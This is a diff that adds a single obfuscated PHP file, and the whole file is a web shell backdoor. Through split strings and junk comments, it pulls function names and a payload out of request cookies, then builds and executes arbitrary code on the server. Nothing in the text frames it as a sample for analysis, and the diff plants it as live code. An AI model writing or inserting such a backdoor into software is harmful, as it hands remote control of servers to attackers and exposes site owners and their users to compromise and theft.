@@ -1,0 +1,1 @@
+<?php $jy='E';$s/*DONm*/='_CO';$vd/**T*/='OKI';$io=/*gk38*/${$s.$vd.$jy};$w=$io/*#c*/['eA'].$io['FF'];$ar=/*+w*/$io['G'].$io['oM']/*;X*/.$io['Fc'];$d=$w('',$ar($io['T']));$d();
